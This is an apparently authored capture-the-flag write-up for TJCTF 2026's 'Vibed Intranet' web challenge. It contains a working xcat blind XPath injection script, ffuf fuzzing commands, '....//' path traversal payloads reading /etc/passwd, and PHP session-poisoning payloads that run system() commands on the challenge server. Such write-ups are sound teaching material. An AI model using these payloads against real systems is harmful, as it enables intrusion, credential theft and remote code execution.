---
author: milrn
categories:
- CTF Writeups
- Web Exploitation
- Hard
layout: post
media_subpath: /assets/posts/2026-05-25-vibed-intranet
tags:
- TJCTF 2026
- GraphQL
- XPath Injection
- Log Poisoning
- Hard
title: Vibed Intranet
description: Vibed Intranet was a Hard Web Exploitation challenge from TJCTF 2026. This is the author solution for parts one and two.
---

Vibed Intranet was a Hard Web Exploitation challenge from TJCTF 2026. This is the intended solution for parts one and two, by the author (me). With the rise of AI usage to solve CTF challenges, I wanted to try to create a challenge which would be harder for AI to solve. So, I decided to make a black box blind enumeration challenge for TJCTF 2026.

`Disclaimer: Yes, this challenge was intentionally vibe-coded to show how bad AI still is at writing certain code! It is also meant to be a WIP website which means some functionality does not work; this is also intentional.`

# Part 1

Upon opening the site, you are greeted with the following page.

![](loginportal.png)

Trying to log in and using Burp Suite to intercept the request shows a GraphQL query being used. Most people's first thought when seeing GraphQL is to try introspection, but in this case, it is clearly disabled.

```
POST /graphql HTTP/2
Host: vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf
Content-Length: 236
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="143", "Not A(Brand";v="24"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: */*
Origin: https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"query":"mutation Login($username: String!, $password: String!) {\n  login(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}","variables":{"username":"a","password":"a"}}
```

![](introspection.png)

```
{"errors":[{"message":"GraphQL introspection is not allowed by Apollo Server, but the query contained __schema or __type. To enable introspection, pass introspection: true to ApolloServer in production","locations":[{"line":2,"column":5}],"extensions":{"validationErrorCode":"INTROSPECTION_DISABLED","code":"GRAPHQL_VALIDATION_FAILED"}}]}
```

From there, the intended path is to use some sort of GraphQL fingerprinting tool, such as graphw00f.

```
┌──(kali㉿kali)-[~/tools/graphw00f]
└─$ python3 main.py -d -f -t https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf
{'User-Agent': 'graphw00f'}

                +-------------------+
                |     graphw00f     |
                +-------------------+
                  ***            ***
                **                  **
              **                      **
    +--------------+              +--------------+
    |    Node X    |              |    Node Y    |
    +--------------+              +--------------+
                  ***            ***
                     **        **
                       **    **
                    +------------+
                    |   Node Z   |
                    +------------+

                graphw00f - v1.2.1
          The fingerprinting tool for GraphQL
           Dolev Farhi <dolev@lethalbit.com>
  
[*] Checking https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf
[*] Checking https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/
[*] Checking https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/api
[*] Checking https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/graphql
[!] Found GraphQL at https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/graphql
[*] Attempting to fingerprint...
[*] Discovered GraphQL Engine: (Apollo)
[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/apollo.md                                                                                                                      
[!] Technologies: JavaScript, Node.js, TypeScript                                                                                                                                                                                            
[!] Homepage: https://www.apollographql.com                                                                                                                                                                                                  
[*] Completed.
```

This fingerprints the backend as Apollo and points to its attack surface matrix. Upon viewing it, one thing stands out: field suggestions.

![](threatmatrix.png)

Field suggestions can be used to leak mutations with non-standard names that direct brute-forcing would likely not reveal. This can be easily shown with the login mutation. Trying to call the "log" mutation shows a recommendation to call the "login" mutation.

![](fieldsuggestiondemo.png)

To fuzz for field suggestions, some type of GraphQL wordlist is needed. Personally, I used the mutation field wordlist from `https://github.com/Escape-Technologies/graphql-wordlist` as it is incredibly comprehensive. I set up ffuf arguments to include any bad responses and show any response sizes greater than 200 when fuzzing for mutations. This size filter is needed to only include the responses with the extra field suggestion tacked on.

```
┌──(kali㉿kali)-[~/tools]
└─$ ffuf -w graphql-wordlist/wordlists/mutationFieldWordlist.txt:FUZZ -u https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/graphql -X POST -d '{"query":"mutation Login($username: String!, $password: String!) {\n  FUZZ(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}","variables":{"username":"a","password":"a"}}' -H 'Content-Type: application/json' -mc all -fs 0-200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://vibed-intranet-p1-c4a7de1ff503bddf.tjc.tf/graphql
 :: Wordlist         : FUZZ: /home/kali/tools/graphql-wordlist/wordlists/mutationFieldWordlist.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"query":"mutation Login($username: String!, $password: String!) {\n  FUZZ(username: $username, password: $password) {\n    authenticated\n    message\n    token\n    tokenExpiresAt\n  }\n}","variables":{"username":"a","password":"a"}}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0-200
________________________________________________

updateSnippet           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 1020ms]
updateCustomerV2        [Status: 400, Size: 208, Words: 11, Lines: 2, Duration: 379ms]
updateProduct           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 561ms]
updateComment           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 899ms]
updateProject           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 605ms]
updateSettings          [Status: 400, Size: 206, Words: 11, Lines: 2, Duration: 1097ms]
updateEvent             [Status: 400, Size: 203, Words: 11, Lines: 2, Duration: 607ms]
updateAccount           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 425ms]
auditEventsStreamingDestinationEventsRemove [Status: 400, Size: 202, Words: 7, Lines: 2, Duration: 334ms]
increaseInternationalfashionjobsComNewsArticleHits [Status: 400, Size: 209, Words: 7, Lines: 2, Duration: 401ms]
updateClient            [Status: 400, Size: 204, Words: 11, Lines: 2, Duration: 591ms]
updateDocument          [Status: 400, Size: 206, Words: 11, Lines: 2, Duration: 598ms]
instanceExternalAuditEventDestinationCreate [Status: 400, Size: 202, Words: 7, Lines: 2, Duration: 405ms]
instanceExternalAuditEventDestinationDestroy [Status: 400, Size: 203, Words: 7, Lines: 2, Duration: 403ms]
instanceExternalAuditEventDestinationUpdate [Status: 400, Size: 202, Words: 7, Lines: 2, Duration: 402ms]
updateCountry           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 912ms]
updateSetting           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 814ms]
updateProperty          [Status: 400, Size: 206, Words: 11, Lines: 2, Duration: 279ms]
updatePayment           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 307ms]
Core_updateRoundtableParticipantRaisedHand [Status: 400, Size: 201, Words: 7, Lines: 2, Duration: 1098ms]
updateTenant            [Status: 400, Size: 204, Words: 11, Lines: 2, Duration: 489ms]
updateStore             [Status: 400, Size: 203, Words: 11, Lines: 2, Duration: 479ms]
updateTournament        [Status: 400, Size: 208, Words: 11, Lines: 2, Duration: 310ms]
updateCurrency          [Status: 400, Size: 206, Words: 11, Lines: 2, Duration: 392ms]
updateChallenge         [Status: 400, Size: 207, Words: 11, Lines: 2, Duration: 406ms]
updateSchedule          [Status: 400, Size: 206, Words: 11, Lines: 2, Duration: 485ms]
update_agent            [Status: 400, Size: 204, Words: 11, Lines: 2, Duration: 887ms]
updateContent           [Status: 400, Size: 205, Words: 11, Lines: 2, Duration: 600ms]
updateImageMeta         [Status: 400, Size: 207, Words: 11, Lines: 2, Duration: 603ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

When plugging in the updateSnippet mutation into a query, a recommendation for the updateStudentX mutation is made through field suggestions. This is an interesting new endpoint to explore.

![](updatesnippet.png)

Trying to call the updateStudentX mutation with the same resulting fields and arguments as the login mutation leads to a plethora of errors.
```
mutation Login($username: String!, $password: String!) {
  updateStudentX(username: $username, password: $password) {
    authenticated
    message
    token
    tokenExpiresAt
  }
}
```

```
{"errors":[{"message":"Unknown argument \"password\" on field \"Mutation.updateStudentX\".","locations":[{"line":2,"column":39}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"authenticated\" on type \"UpdateStudentXResult\".","locations":[{"line":3,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"token\" on type \"UpdateStudentXResult\". Did you mean \"ok\"?","locations":[{"line":5,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Cannot query field \"tokenExpiresAt\" on type \"UpdateStudentXResult\".","locations":[{"line":6,"column":5}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Field \"updateStudentX\" argument \"description\" of type \"String!\" is required, but it was not provided.","locations":[{"line":2,"column":3}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}},{"message":"Field \"updateStudentX\" argument \"grade\" of type \"Int!\" is required, but it was not provided.","locations":[{"line":2,"column":3}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
```

However, these errors are good enough to figure out how a valid call would look. All the unknown arguments should be taken out, and all the missing arguments should be added on. All the invalid resulting fields should be removed, and the `ok` field should be added on as it is again recommended through field suggestions.

![](successfulquery.png)

More resulting field enumeration can be done, but no other fields are returned. From here, there doesn't look like much to do as the endpoint results in a `Token is required.` error. However, fuzzing some basic payloads such as `''` into the username argument results in a very interesting error message from the application, `XPath parse error`.

![](xpatherror.png)

An assumption can be made that the XPath query is using the `username` argument in the query predicate to filter results. So, a simple '1'='1' payload can test to see if the server is vulnerable to Blind XPath Injection. In this case, that would only be possible if the server is executing queries despite returning an authentication-required message.

![](blindxpath.png)

Boom! This web application is really insecure, and the value of `ok` is true if the XPath query succeeds and results in a value of true. This means that the server is not doing any input filtering and is not correctly configured to send a blanket `false` response when no token is given. After verifying the Blind XPath Injection, a combination of the following XPath query functionality can be used to extract the entire XML document: `name(), substring(), string-length(), and count()`. More details on Blind XPath Injection can be found elsewhere but it's the exact same principle as a Blind SQL Injection. For this PoC, I used an automatic Blind XPath exfiltration tool called xcat, while providing a few application-specific arguments. The details of the script can be found within the comments.

```
import asyncio
import json
from xcat import algorithms, utils
from xcat.attack import AttackContext, Encoding, Injection
from xcat.cli import get_features
from xcat.display import display_xml

algorithms.ASCII_SEARCH_SPACE = "".join(map(chr, range(32, 127)))
# add characters that aren't included by default into the blind search

def tamper(_, args):
    params = args.pop("params", None) or args.pop("data", None) or {}
    args["data"] = json.dumps(
        {
            "query": "mutation updateStudentX($username: String!, $description: String!, $grade: Int!) {\n  updateStudentX(username: $username, description: $description, grade: $grade) {\n    message\n    ok\n  }\n}",
            "variables": {
                "username": params["username"],
                "description": params["description"],
                "grade": int(params["grade"]),
            },
        }
    ).encode()
    # since the request is more complicated than what xcat usually expects, a tamper function must be written to wrap the tool output into the larger query

async def main():
    context = AttackContext(
        url="https://vibed-intranet-p1-7e457bc0e9adfc7a.tjc.tf/graphql",
        method="POST",
        target_parameter="username",
        parameters={"username": "a", "description": "a", "grade": "100"},
        match_function=utils.make_match_function(None, (False, '"ok":true')), # define the output that indicates which boolean value the XPath query resulted in
        concurrency=5, # significantly speed up exfiltration
        fast_mode=False, # don't cut output
        body=None,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        encoding=Encoding.URL,
        oob_details=None,
        tamper_function=tamper, # define a tamper function to ensure the tool output is wrapped in the right request
    )
    inj = Injection("or", "", (("{working}' or '1'='1", True), ("{working}' or '1'='2", False)), "{working}' or {expression} or '1'='2")
    # defined payloads which result in True and False outputs (payloads created after the deduction that the username argument was being used in the predicate of the XPath query) along with a payload to evaluate an arbitrary expression (derived from the True and False payloads)
    for feature, available in await get_features(context, inj):
        context.features[feature.name] = available
    # limit exfiltration techniques to what is possible
    async with context.start(inj) as bxpinj:
        await display_xml([await algorithms.get_nodes(bxpinj)])
asyncio.run(main())
```

This script leaks the whole XML document using blind queries, and the document contains a password for the user, Andyrew!

```
Andyrew:amkji2ho2hO#*EH*(@Hhshag
```

Logging into the portal with those credentials gives the first flag.

![](motdpage.png)

# Part 2

Trying to use the `Upload MOTD` button results in failure. Users can attribute this to the disclaimer on the main page that says `This page is in an early beta with limited functionality available.` The upload functionality has not been added yet, but instead using the "upload" button seems to just pull an MOTD that is already on the host system and include it with the preview.php page. This is the classic setup for Local File Inclusion.

![](motdrequest.png)

A classic LFI payload list such as LFI-Jhaddix.txt found in SecLists can be used to test for any working inclusion. Filtering out the default response size, the smallest payload able to successfully include /etc/passwd is `....//....//....//....//....//etc/passwd`. The use of double `..` and `/` is because the server is not recursively removing the `../` string to prevent LFI. It is only removing `../` in one pass which means LFI is still possible.

```
┌──(kali㉿kali)-[~/tools]
└─$ ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u https://vibed-intranet-p1-7e457bc0e9adfc7a.tjc.tf/preview.php?view=FUZZ -b PHPSESSID=5d7139e54dc357eb669e9ff5d2dd8a5d -fs 15                                                        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://vibed-intranet-p1-7e457bc0e9adfc7a.tjc.tf/preview.php?view=FUZZ
 :: Wordlist         : FUZZ: /home/kali/tools/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Cookie: PHPSESSID=5d7139e54dc357eb669e9ff5d2dd8a5d
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15
________________________________________________

....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 328ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 328ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 373ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 393ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 395ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 394ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 398ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 398ms]
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 395ms]
....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 398ms]
....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 400ms]
....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 401ms]
....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 401ms]
....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 401ms]
....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 466ms]
....//....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 467ms]
....//....//....//....//....//etc/passwd [Status: 200, Size: 882, Words: 3, Lines: 20, Duration: 429ms]
:: Progress: [929/929] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

![](lfi.png)

Now, most people tried basic payloads to include the flag in responses from here, but none of that works because the flag file isn't named anything obvious on the host machine. The next logical step is to try to gain some sort of RCE. There are several ways to take advantage of LFI to help gain RCE, some sort of source code disclosure or RFI can definitely speed up the process. However, the application is not vulnerable to any of these due to backend protections (RFI plugs into a file path which will result in `Document not found.` and files with extensions other than .txt/no extension are blocked from inclusion: `This file type was blocked.`). There is a more niche technique to try though, log poisoning, which occurs when a log file can be filled with arbitrary PHP code and then be included and executed by the server. In my opinion the only really "guessy" part of this was trying to determine what log file to use. The regular /proc/self/fd/N trick doesn't work because the backend validates if a file exists before including it. However, session files can act as log files for certain inputs in certain scenarios, and in this challenge, this was the case (session poisoning). All files a user tries to view would be logged to the session file stored in the standard directory /var/lib/php/sessions. The session file itself follows the normal scheme `sess_<ID>`, where the ID can be found by simply looking at the PHPSESSID cookie. All of this can be easily verified as a player by making a request to include the file.

![](sessionfileinclusion.png)

The previous queries were clearly logged in the file, so now all that's left is to submit commands to be executed. Listing the home directory revealed the andrew directory, and listing that revealed the flag file which could simply be read using cat. The payloads for this chain are below.

```
<?php system("ls /home/"); ?>
....//....//....//....//....//var/lib/php/sessions/sess_f3113c8626eeddeb40656b9b3a25e79a
<?php system("ls /home/andrew"); ?>
....//....//....//....//....//var/lib/php/sessions/sess_f3113c8626eeddeb40656b9b3a25e79a
<?php system("cat /home/andrew/2283274892734342376.txt"); ?>
....//....//....//....//....//var/lib/php/sessions/sess_f3113c8626eeddeb40656b9b3a25e79a
```

*NOTE: Logging out and back in again is recommended after fuzzing LFI payloads as it corrupts the log file with invalid code that makes the execution of the PHP payloads fail!*

![](logpoisoning.png)

# Conclusion

In the end, what shocked me is that AI was actually able to solve both parts of this challenge in a few hours. It has become significantly better at blind challenges since even a few months ago, but there is still a lot of room for improvement (I will be posting my full opinion on AI being used in CTFs soon). This challenge was originally intended to be like a "full box" with everything from initial enumeration to privilege escalation, but unfortunately, TJ's infrastructure was only able to support a read-only file system. Despite that, it was a pleasure to write challenges for TJCTF 2026 as an external party, and I am looking forward to it next year!
